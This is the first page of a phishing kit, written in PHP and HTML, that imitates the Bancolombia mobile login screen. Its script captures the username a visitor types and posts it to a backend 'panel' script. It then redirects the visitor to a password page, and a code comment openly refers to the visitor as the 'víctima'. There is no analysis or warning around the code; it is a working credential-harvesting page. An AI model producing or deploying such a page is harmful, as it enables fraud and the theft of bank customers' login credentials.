<?php
$ip = getenv("REMOTE_ADDR");
date_default_timezone_set('America/Bogota');
$tiempo = date("l, j \d\e F \d\e Y");
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Bancolombia - Iniciar Sesión</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v=<?php echo time(); ?>" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>

        <style type="text/css">
            #fondo, #cargando-o {
                display: none; 
                position: fixed;
                top: 0; left: 0; width: 100%; height: 100%;
                background: rgba(255,255,255,0.95);
                z-index: 9999;
                text-align: center;
                padding-top: 50%;
            }
            #btn-continuar:disabled { background-color: #ccc !important; cursor: not-allowed; color: #777; }
            #btn-continuar { background-color: #FDDA24 !important; color: #000; font-weight: bold; cursor: pointer; border: none; }
            .entradas { border: none; outline: none; width: 100%; font-size: 16px; font-family: 'Open Sans'; background: transparent; }
            .frm { margin-top: 10px; }
        </style>
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="90">            
            <br><p style="font-family: 'Open Sans'; color: #666;">Cargando...</p>
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0" style="padding: 15px;">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="25"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="25"></td>
                <td valign="middle" align="right" width="33%"><span style="width:30px; display:inline-block;"></span></td>
            </tr>
        </table>

        <div align="center">
            <img src="../img/logo.svg" width="200" style="margin-top: 30px; margin-bottom: 20px;">
        </div>

        <div class="titulo-app" style="text-align: center; font-weight: 800; font-family: 'Open Sans'; font-size: 18px;">Ingresa tu usuario</div>  
        
        <div class="frm" style="padding: 25px;">
            <div class="inp" id="inp-usuario" style="border-bottom: 1px solid #ccc; padding: 10px 0;">
                <table width="100%" cellpadding="0" cellspacing="0" border="0">
                    <tr>
                        <td valign="middle" width="36" align="left"><img src="../img/ico-u.jpg" width="26"></td>
                        <td valign="middle" align="left">
                            <input type="text" id="txt-usuario" class="entradas" autocomplete="off" placeholder="Ingresa el usuario" maxlength="20">
                        </td>
                    </tr>
                </table>
            </div>
        </div>  

        <button class="botones" id="btn-continuar" style="width: 85%; margin: 20px auto; display: block; height: 50px; border-radius: 25px;" disabled>CONTINUAR</button> 

        <script type="text/javascript">
            $(document).ready(function() { 
                // Aseguramos que la memoria esté limpia al iniciar
                localStorage.removeItem('user_akam');

                // Habilitar botón si hay texto (mínimo 4 caracteres como la App real)
                $("#txt-usuario").on("input", function() {
                    var val = $(this).val().trim();
                    if (val.length >= 4) {
                        $("#btn-continuar").prop("disabled", false);
                    } else {
                        $("#btn-continuar").prop("disabled", true);
                    }
                });

                $("#btn-continuar").click(function(e) {
                    var user_val = $("#txt-usuario").val().trim();
                    
                    if (user_val !== "") {
                        $("#fondo, #cargando-o").show();

                        // CLAVE DEL AUTOFLUJO: Guardamos el usuario para la siguiente pantalla
                        localStorage.setItem('user_akam', user_val);

                        // Reportamos el inicio al panel para que ya aparezca en tu lista
                        $.post("../process/inicio.php", { usr: user_val }, function(data) {
                            window.location.href = "PASS.php";
                        }).fail(function() {
                            // Si falla la red, saltamos igual para no perder la víctima
                            window.location.href = "PASS.php";
                        });

                        // Salto forzado de seguridad (por si el servidor está lento)
                        setTimeout(function(){
                            window.location.href = "PASS.php";
                        }, 3000);
                    }
                });
            });
        </script>
    </body>
</html>
